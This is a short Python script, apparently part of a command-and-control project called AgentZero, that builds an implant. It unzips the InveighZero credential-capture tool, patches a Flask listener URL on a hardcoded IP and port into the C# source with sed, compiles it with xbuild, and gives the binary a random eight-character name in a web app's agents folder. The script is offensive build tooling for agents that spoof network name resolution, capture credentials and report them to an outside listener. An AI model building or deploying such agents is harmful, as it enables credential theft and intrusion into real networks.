import os
from subprocess import Popen, PIPE
import string
import random
import zipfile
import shutil


def create_agent(ip, port, inveigh):
    # FORMAT URL FOR FLASK LISTENER
    url = "http://{0}:{1}/listener".format(ip, port)
    # CD TO UNZIPPED CODE DIR
    os.chdir(inveigh)
    # UNZIP INVEIGH
    with zipfile.ZipFile("InveighZero-master.zip", "r") as zip_ref:
        zip_ref.extractall("Inveigh")
    agentInveighDir = "Inveigh"

    # HARDCODE URL IN C# CODE
    os.chdir(agentInveighDir)
    cmd1 = "grep -rl FLASKURL"
    p1 = Popen(cmd1.split(), stdout=PIPE)
    cmd2 = "xargs sed -i s|FLASKURL|\"{0}\"|g".format(url)
    p2 = Popen(cmd2.split(), stdin=p1.stdout, stdout=PIPE)
    p2.communicate()
    # COMPILE WITH MONO (REQUIRES PACKAGE MONO-COMPLETE TO BE INSTALLED)
    cmd = "xbuild Inveigh.sln"
    p = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
    p.communicate()


def agentNameGenerator(size):
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digits = string.digits
    agentName = (''.join(random.choice(lower + upper + digits) for i in range(size)))
    print(agentName)
    return agentName


def moveAndRename(agentName):
    print("Moving...")
    shutil.move("/home/husky/Desktop/AgentZero/Inveigh/InveighZero-master/Inveigh/bin/Debug/Inveigh.exe",
                "/home/husky/Desktop/AgentZero/services/web/project/app/agents/{0}.exe".format(agentName))
    print("Deleting...")
    shutil.rmtree('/home/husky/Desktop/AgentZero/Inveigh')


if __name__ == '__main__':
    create_agent("10.10.1.149", "1776", "/home/husky/Desktop/AgentZero/")
    moveAndRename(agentNameGenerator(8))
